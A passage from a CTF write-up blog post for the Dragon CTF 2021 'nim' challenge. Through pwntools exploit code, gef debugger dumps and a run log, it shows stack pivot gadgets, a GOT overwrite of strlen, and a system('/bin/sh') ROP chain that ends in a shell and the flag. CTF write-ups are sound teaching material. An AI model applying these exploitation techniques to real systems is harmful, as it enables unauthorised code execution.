<p>This would pivot the stack into the last qword from <code class="language-plaintext highlighter-rouge">username</code>. Constraints for <code class="language-plaintext highlighter-rouge">one_gadget</code> don’t seem satisfiable at that point, so we will just put another stack pivot gadget into our username</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x000000000011163c: add rsp, 0x68; ret; </code></pre></figure>

<p>This would then pivot the stack into our heap size definitions. So, before doing the overflow, we would put a <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> ropchain there, just waiting to get executed :)</p>

<p>So, the attack plan would be as follow</p>

<ul>
  <li>Put <code class="language-plaintext highlighter-rouge">add rsp, 0x68</code> gadget into username</li>
  <li>Prepare ropchain in game heap sizes</li>
  <li>Use record arb write to write <code class="language-plaintext highlighter-rouge">add rsp, 0x2c8...</code> gadget into <code class="language-plaintext highlighter-rouge">strlen</code> libc got</li>
</ul>

<p>Putting the gadget into the username is trivial</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Put stack pivot gadget into username"</span><span class="p">)</span>

<span class="c1"># 0x000000000011163c: add rsp, 0x68; ret; 
</span><span class="n">ADDRSP68</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x11163c</span>

<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"[y/n]"</span><span class="p">,</span> <span class="s">"n"</span><span class="p">)</span>       <span class="c1"># quit game
</span><span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="s">"p"</span><span class="p">)</span>          <span class="c1"># start new game
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">16</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ADDRSP68</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"? "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>

<p>Now, we have to prepare our current game score for writing the stack pivot gadget later on into <code class="language-plaintext highlighter-rouge">strlen</code> libc got.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># 0x0000000000089d27: add rsp, 0x2c0; pop rbp; pop r12; pop r13; ret;
</span><span class="n">ADDRSP2D8</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x89d27</span>

<span class="n">score</span> <span class="o">=</span> <span class="mi">10000</span>	
<span class="n">target</span> <span class="o">=</span> <span class="p">(</span><span class="n">ADDRSP2D8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Target: %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>

<span class="k">while</span><span class="p">(</span><span class="n">score</span> <span class="o">&lt;</span> <span class="n">target</span> <span class="o">-</span> <span class="n">score</span><span class="p">):</span>
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Score: %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">score</span><span class="p">))</span>			
	<span class="n">win</span><span class="p">(</span><span class="n">score</span><span class="p">)</span>		
	<span class="n">score</span> <span class="o">+=</span> <span class="n">score</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"? "</span><span class="p">,</span> <span class="s">"y"</span><span class="p">)</span>		
	
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Win last game for exact score"</span><span class="p">)</span>	
<span class="n">win</span><span class="p">(</span><span class="n">target</span><span class="o">-</span><span class="n">score</span><span class="o">+</span><span class="mi">10</span><span class="p">)</span>		<span class="c1"># 10 will be used up in last game</span></code></pre></figure>

<p>Target score will be lower 4 bytes of the gadget and we’ll just have to continue playing until our score matches <code class="language-plaintext highlighter-rouge">target+10</code> (because we will do a last game losing 10 credits for putting our ropchain on the stack).</p>

<p>Having prepared the arb write, we can now put our ropchain on the stack by setting heap sizes alternating to higher or lower 4 bytes of the ropchain gadgets.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Put ropchain on stack"</span><span class="p">)</span>	
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"? "</span><span class="p">,</span> <span class="s">"y"</span><span class="p">)</span>
<span class="n">num_heaps</span> <span class="o">=</span> <span class="mi">44</span>
<span class="n">play</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="n">num_heaps</span><span class="p">)</span>
	
<span class="n">POPRDI</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x26b72</span>
<span class="n">ABSGOT</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1eb0a8</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1e0000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>		
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh"</span><span class="p">)))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ABSGOT</span><span class="p">)</span> <span class="o">*</span> <span class="mi">10</span>
	
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="nb">abs</span><span class="p">(</span><span class="n">num_heaps</span><span class="o">/</span><span class="mi">4</span><span class="p">))):</span>
	<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"."</span><span class="p">)</span>
	<span class="n">target</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">:(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">])</span>

	<span class="n">p1</span> <span class="o">=</span> <span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
	<span class="n">p2</span> <span class="o">=</span> <span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span>		

	<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">p1</span><span class="p">))</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">p2</span><span class="p">))</span></code></pre></figure>

<p>At this point it gets a bit tricky. If you have ASLR disabled for debugging the exploit, it will always fail, since the score will be checked as signed integer and playing this way with disabled ASLR will always result in a negative score, thus exitting early.</p>

<p>Having ASLR enabled on the other hand, the probability of having a non negative score is quite high.</p>

<p>When we now resign after having prepared the ropchain, the arbitrary write will happen</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x000055c6834980cc in ?? ()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x4a              
$rbx   : 0x721346e3e0248000
$rcx   : 0x50b4dd27        
$rdx   : 0x00007f8950caf0a8  →  0x00007f8950c4f660  →  &lt;__strlen_avx2+0&gt; endbr64 
$rsp   : 0x00007ffceb247860  →  0x000055c684db2f08  →  0x000055c684db2f18  →  0x0000006563696c00
$rbp   : 0x00007ffceb247ae0  →  0x00007f8950caf0a8  →  0x00007f8950c4f660  →  &lt;__strlen_avx2+0&gt; endbr64 
$rsi   : 0x00007ffceb2451c0  →  "[!] "`-._,-'"`-._,-' NEW ALL TIME RECORD: 13540303[...]"
$rdi   : 0x00007f8950cb24c0  →  0x0000000000000000
$rip   : 0x000055c6834980cc  →   mov DWORD PTR [rdx], ecx
$r8    : 0x4a              
$r9    : 0x4a              
$r10   : 0x000055c68349c52b  →  " pts "`-._,-'"`-._,-'\n"
$r11   : 0x246             
$r12   : 0x000055c683497220  →   endbr64 
$r13   : 0x00007ffceb247c40  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55c6834980bd                  call   0x55c683497030 &lt;printf@plt&gt;
   0x55c6834980c2                  mov    ecx, DWORD PTR [rbp-0xf4]
   0x55c6834980c8                  mov    rdx, QWORD PTR [rbp+0x18]
 → 0x55c6834980cc                  mov    DWORD PTR [rdx], ecx
   0x55c6834980ce                  mov    rax, QWORD PTR fs:0x28
   0x55c6834980d7                  mov    rcx, QWORD PTR [rbp-0x10]
   0x55c6834980db                  cmp    rax, rcx
   0x55c6834980de                  jne    0x55c6834980fa
   0x55c6834980e4                  add    rsp, 0x278
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffceb247860│+0x0000: 0x000055c684db2f08  →  0x000055c684db2f18  →  0x0000006563696c00	 ← $rsp
0x00007ffceb247868│+0x0008: 0x000055c684db40c0  →  0x000055c684db4000  →  0x4141414141414141
0x00007ffceb247870│+0x0010: 0x00007ffceb247a08  →  0x00007ffceb247a18  →  0x0000000000000000
0x00007ffceb247878│+0x0018: 0x50b4dd2783499914
0x00007ffceb247880│+0x0020: 0x0000003700000001
0x00007ffceb247888│+0x0028: 0x0000003884db2fb8</code></pre></figure>

<p>We’ll now be overwriting the lower 4 bytes of <code class="language-plaintext highlighter-rouge">strlen</code> got with the value from <code class="language-plaintext highlighter-rouge">rcx</code> (<code class="language-plaintext highlighter-rouge">0x50b4dd27</code>), so <code class="language-plaintext highlighter-rouge">strlen</code> got will now point to the first stack pivot gadget.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/10i 0x00007f8950b4dd27
   0x7f8950b4dd27 &lt;__swscanf+295&gt;:	add    rsp,0x2c0
   0x7f8950b4dd2e &lt;__swscanf+302&gt;:	pop    rbp
   0x7f8950b4dd2f &lt;__swscanf+303&gt;:	pop    r12
   0x7f8950b4dd31 &lt;__swscanf+305&gt;:	pop    r13
   0x7f8950b4dd33 &lt;__swscanf+307&gt;:	ret    </code></pre></figure>

<p>Now, canary check will fail and <code class="language-plaintext highlighter-rouge">__stack_chk_fail</code> will get executed (=&gt; <code class="language-plaintext highlighter-rouge">__GI___fortify_fail</code> =&gt; <code class="language-plaintext highlighter-rouge">__libc_message</code> =&gt; <code class="language-plaintext highlighter-rouge">strlen</code>)</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">   0x55c6834980ed                  ret    
   0x55c6834980ee                  mov    rdi, QWORD PTR [rbp-0x190]
   0x55c6834980f5                  call   0x55c6834971a0 &lt;_Unwind_Resume@plt&gt;
 → 0x55c6834980fa                  call   0x55c683497100 &lt;__stack_chk_fail@plt&gt;
   ↳  0x55c683497100 &lt;__stack_chk_fail@plt+0&gt; jmp    QWORD PTR [rip+0x8e6a]        # 0x55c68349ff70 &lt;__stack_chk_fail@got.plt&gt;
      0x55c683497106 &lt;__stack_chk_fail@plt+6&gt; push   0xd
      0x55c68349710b &lt;__stack_chk_fail@plt+11&gt; jmp    0x55c683497020
      0x55c683497110 &lt;__isoc99_scanf@plt+0&gt; jmp    QWORD PTR [rip+0x8e62]        # 0x55c68349ff78 &lt;__isoc99_scanf@got.plt&gt;
      0x55c683497116 &lt;__isoc99_scanf@plt+6&gt; push   0xe
      0x55c68349711b &lt;__isoc99_scanf@plt+11&gt; jmp    0x55c683497020
	
...

   0x7f8950bf6b05 &lt;__stack_chk_fail+5&gt; pop    rax
   0x7f8950bf6b06 &lt;__stack_chk_fail+6&gt; lea    rdi, [rip+0x87557]        # 0x7f8950c7e064
   0x7f8950bf6b0d &lt;__stack_chk_fail+13&gt; sub    rsp, 0x8
 → 0x7f8950bf6b11 &lt;__stack_chk_fail+17&gt; call   0x7f8950bf6b20 &lt;__GI___fortify_fail&gt;

...

   0x7f8950bf6b3b &lt;__fortify_fail+27&gt; mov    rsi, rbp
   0x7f8950bf6b3e &lt;__fortify_fail+30&gt; mov    edi, 0x1
   0x7f8950bf6b43 &lt;__fortify_fail+35&gt; xor    eax, eax
 → 0x7f8950bf6b45 &lt;__fortify_fail+37&gt; call   0x7f8950b54150 &lt;__libc_message&gt;

...

   0x7f8950b54279 &lt;__libc_message+297&gt; add    rbx, 0x2
   0x7f8950b5427d &lt;__libc_message+301&gt; mov    rdi, rcx
   0x7f8950b54280 &lt;__libc_message+304&gt; mov    QWORD PTR [rbp-0x88], rcx
 → 0x7f8950b54287 &lt;__libc_message+311&gt; call   0x7f8950ae9460 &lt;*ABS*+0xa27b0@plt&gt;
   ↳  0x7f8950ae9460 &lt;*ABS*+0xa27b0@plt+0&gt; endbr64 
      0x7f8950ae9464 &lt;*ABS*+0xa27b0@plt+4&gt; bnd    jmp QWORD PTR [rip+0x1c5c3d]        # 0x7f8950caf0a8 &lt;*ABS*@got.plt&gt;

...

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x18              
$rbx   : 0x00007f8950c7e082  →  " ***: terminated\n"
$rcx   : 0x00007f8950c7e064  →  "stack smashing detected"
$rdx   : 0x00007ffceb2477d0  →  0x00007f8950c7e064  →  "stack smashing detected"
$rsp   : 0x00007ffceb247768  →  0x00007f8950b5428c  →  &lt;__libc_message+316&gt; mov rcx, QWORD PTR [rbp-0x88]
$rbp   : 0x00007ffceb247820  →  0x00007f8950c7e07c  →  "*** %s ***: terminated\n"
$rsi   : 0x25              
$rdi   : 0x00007f8950c7e064  →  "stack smashing detected"
$rip   : 0x00007f8950b4dd27  →  &lt;swscanf+295&gt; add rsp, 0x2c0
$r8    : 0x4               
$r9    : 0x4a              
$r10   : 0x000055c68349c52b  →  " pts "`-._,-'"`-._,-'\n"
$r11   : 0x246             
$r12   : 0x00007ffceb247770  →  0x00007f8950c7e07c  →  "*** %s ***: terminated\n"
$r13   : 0x25              
$r14   : 0x1               
$r15   : 0x1               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f8950b4dd14 &lt;swscanf+276&gt;    mov    rdx, QWORD PTR [rsp+0x208]
   0x7f8950b4dd1c &lt;swscanf+284&gt;    xor    rdx, QWORD PTR fs:0x28
   0x7f8950b4dd25 &lt;swscanf+293&gt;    jne    0x7f8950b4dd34 &lt;__swscanf+308&gt;
 → 0x7f8950b4dd27 &lt;swscanf+295&gt;    add    rsp, 0x2c0
   0x7f8950b4dd2e &lt;swscanf+302&gt;    pop    rbp
   0x7f8950b4dd2f &lt;swscanf+303&gt;    pop    r12
   0x7f8950b4dd31 &lt;swscanf+305&gt;    pop    r13
   0x7f8950b4dd33 &lt;swscanf+307&gt;    ret    
   0x7f8950b4dd34 &lt;swscanf+308&gt;    call   0x7f8950bf6b00 &lt;__stack_chk_fail&gt;
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffceb247768│+0x0000: 0x00007f8950b5428c  →  &lt;__libc_message+316&gt; mov rcx, QWORD PTR [rbp-0x88]	 ← $rsp
0x00007ffceb247770│+0x0008: 0x00007f8950c7e07c  →  "*** %s ***: terminated\n"	 ← $r12
0x00007ffceb247778│+0x0010: 0x0000000000000004
0x00007ffceb247780│+0x0018: 0x0000000000000000
0x00007ffceb247788│+0x0020: 0x00007f8950b541de  →  &lt;__libc_message+142&gt; movzx edx, BYTE PTR [rax]
0x00007ffceb247790│+0x0028: 0x00007ffceb2477a0  →  0x0000000000000018
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</code></pre></figure>

<p>Executing our first stack pivot gadget.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x00007f8950b4dd33	41	in swscanf.c
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x18              
$rbx   : 0x00007f8950c7e082  →  " ***: terminated\n"
$rcx   : 0x00007f8950c7e064  →  "stack smashing detected"
$rdx   : 0x00007ffceb2477d0  →  0x00007f8950c7e064  →  "stack smashing detected"
$rsp   : 0x00007ffceb247a40  →  0x00007f8950bd563c  →  &lt;fcntl64+92&gt; add rsp, 0x68
$rbp   : 0x721346e350b4dd27
$rsi   : 0x25              
$rdi   : 0x00007f8950c7e064  →  "stack smashing detected"
$rip   : 0x00007f8950b4dd33  →  &lt;swscanf+307&gt; ret 
$r8    : 0x4               
$r9    : 0x4a              
$r10   : 0x000055c68349c52b  →  " pts "`-._,-'"`-._,-'\n"
$r11   : 0x246             
$r12   : 0x4141414141414141 ("AAAAAAAA"?)
$r13   : 0x4141414141414141 ("AAAAAAAA"?)
$r14   : 0x1               
$r15   : 0x1               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f8950b4dd2e &lt;swscanf+302&gt;    pop    rbp
   0x7f8950b4dd2f &lt;swscanf+303&gt;    pop    r12
   0x7f8950b4dd31 &lt;swscanf+305&gt;    pop    r13
 → 0x7f8950b4dd33 &lt;swscanf+307&gt;    ret    
   ↳  0x7f8950bd563c &lt;fcntl64+92&gt;     add    rsp, 0x68
      0x7f8950bd5640 &lt;fcntl64+96&gt;     ret    
      0x7f8950bd5641 &lt;fcntl64+97&gt;     nop    DWORD PTR [rax+0x0]
      0x7f8950bd5648 &lt;fcntl64+104&gt;    mov    eax, DWORD PTR fs:0x18
      0x7f8950bd5650 &lt;fcntl64+112&gt;    test   eax, eax
      0x7f8950bd5652 &lt;fcntl64+114&gt;    jne    0x7f8950bd5680 &lt;__GI___libc_fcntl64+160&gt;
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffceb247a40│+0x0000: 0x00007f8950bd563c  →  &lt;fcntl64+92&gt; add rsp, 0x68	 ← $rsp
0x00007ffceb247a48│+0x0008: 0x0000000000000000
0x00007ffceb247a50│+0x0010: 0x11d3e4524d309a35
0x00007ffceb247a58│+0x0018: 0x11686a154aedf372
0x00007ffceb247a60│+0x0020: 0x57c3be454d469efd
0x00007ffceb247a68│+0x0028: 0x01aa71650967204d
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</code></pre></figure>

<p>After this, it lands in the second stack pivot gadget, which we prepared in the username (<code class="language-plaintext highlighter-rouge">0x00007ffceb247a40</code>).</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x00007f8950bd5640	51	in ../sysdeps/unix/sysv/linux/fcntl64.c
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x18              
$rbx   : 0x00007f8950c7e082  →  " ***: terminated\n"
$rcx   : 0x00007f8950c7e064  →  "stack smashing detected"
$rdx   : 0x00007ffceb2477d0  →  0x00007f8950c7e064  →  "stack smashing detected"
$rsp   : 0x00007ffceb247ab0  →  0x00007f8950aeab72  →  &lt;init_cacheinfo+242&gt; pop rdi
$rbp   : 0x721346e350b4dd27
$rsi   : 0x25              
$rdi   : 0x00007f8950c7e064  →  "stack smashing detected"
$rip   : 0x00007f8950bd5640  →  &lt;fcntl64+96&gt; ret 
$r8    : 0x4               
$r9    : 0x4a              
$r10   : 0x000055c68349c52b  →  " pts "`-._,-'"`-._,-'\n"
$r11   : 0x246             
$r12   : 0x4141414141414141 ("AAAAAAAA"?)
$r13   : 0x4141414141414141 ("AAAAAAAA"?)
$r14   : 0x1               
$r15   : 0x1               
$eflags: [zero carry parity ADJUST sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f8950bd562d &lt;fcntl64+77&gt;     xor    rcx, QWORD PTR fs:0x28
   0x7f8950bd5636 &lt;fcntl64+86&gt;     jne    0x7f8950bd56d5 &lt;__GI___libc_fcntl64+245&gt;
   0x7f8950bd563c &lt;fcntl64+92&gt;     add    rsp, 0x68
 → 0x7f8950bd5640 &lt;fcntl64+96&gt;     ret    
   ↳  0x7f8950aeab72 &lt;init_cacheinfo+242&gt; pop    rdi
      0x7f8950aeab73 &lt;init_cacheinfo+243&gt; ret    
      0x7f8950aeab74 &lt;init_cacheinfo+244&gt; xor    edi, edi
      0x7f8950aeab76 &lt;init_cacheinfo+246&gt; test   r14, r14
      0x7f8950aeab79 &lt;init_cacheinfo+249&gt; jne    0x7f8950aeab07 &lt;init_cacheinfo+135&gt;
      0x7f8950aeab7b &lt;init_cacheinfo+251&gt; jmp    0x7f8950aeab3a &lt;init_cacheinfo+186&gt;
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffceb247ab0│+0x0000: 0x00007f8950aeab72  →  &lt;init_cacheinfo+242&gt; pop rdi	 ← $rsp
0x00007ffceb247ab8│+0x0008: 0x00007f8950c7b5aa  →  0x0068732f6e69622f ("/bin/sh"?)
0x00007ffceb247ac0│+0x0010: 0x00007f8950b19410  →  &lt;system+0&gt; endbr64 
0x00007ffceb247ac8│+0x0018: 0x00007f8950caf0a8  →  0x00007f8950b4dd27  →  &lt;swscanf+295&gt; add rsp, 0x2c0
0x00007ffceb247ad0│+0x0020: 0x00007f8950caf0a8  →  0x00007f8950b4dd27  →  &lt;swscanf+295&gt; add rsp, 0x2c0
0x00007ffceb247ad8│+0x0028: 0x00007f8950caf0a8  →  0x00007f8950b4dd27  →  &lt;swscanf+295&gt; add rsp, 0x2c0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</code></pre></figure>

<p>which then pivots into our <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> ropchain.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
[*] '/media/sf_ctf/dragon21/nim/libc.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to nim.hackable.software on port 1337: Done
[*] Start playing game
[*] LIBC leak : 0x7fa6333ebe90
[*] LIBC      : 0x7fa6333a1000
[*] Put stack pivot gadget into username
[*] Win games until score matches target
[*] Target: 0x3342ad27
[*] Score: 0x2710
[*] Score: 0x4e20
[*] Score: 0x9c40
[*] Score: 0x13880
[*] Score: 0x27100
[*] Score: 0x4e200
[*] Score: 0x9c400
[*] Score: 0x138800
[*] Score: 0x271000
[*] Score: 0x4e2000
[*] Score: 0x9c4000
[*] Score: 0x1388000
[*] Score: 0x2710000
[*] Score: 0x4e20000
[*] Score: 0x9c40000
[*] Score: 0x13880000
[*] Win last game for exact score
[*] Put ropchain on stack
...........[*] Switching to interactive mode
[!] "`-._,-'"`-._,-' NEW ALL TIME RECORD: 860007719 pts "`-._,-'"`-._,-'
$ ls
flag.txt
nim
$ cat flag.txt
DrgnS{St4ck_b0f_still_expl0itable_in_2021}</code></pre></figure>


    <aside class="share">

      <span>Share this: </span>

      <a href="http://twitter.com/share?text=Dragon CTF 2021 - nim&amp;url=https://kileak.github.io/ctf/2021/dragoncf21-nim/"
      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <i class="icon icon-twitter-rounded"></i>
      </a>

      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2021/dragoncf21-nim/"
      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <i class="icon icon-facebook-rounded"></i>
      </a>

    </aside>
  </div>

  
  <hr>
  <aside id="comments" class="disqus">
    <div class="container">
      <h3><i class="icon icon-comments-o"></i> Comments</h3>
      <div id="disqus_thread"></div>

      <script type="text/javascript">
        var disqus_shortname = 'kileak';
        var disqus_identifier = '/ctf/2021/dragoncf21-nim';
        var disqus_title = 'Dragon CTF 2021 - nim';
        var disqus_url = 'https://kileak.github.io/ctf/2021/dragoncf21-nim';

        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
      </script>

      <noscript>
        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
      </noscript>
    </div>
  </aside>



</article>

        </section>

        
<div class="clearfix"></div>

<footer class="site-footer txt-center">
  <hr>

  <ul class="social">
    
  </ul>

  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>

</footer>


    </main>

    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

    <script src="/js/jquery.min.js"></script>
    <script src="/js/jekyll-search.min.js"></script>
    <script src="/js/main.js"></script>
  </body>
</html>
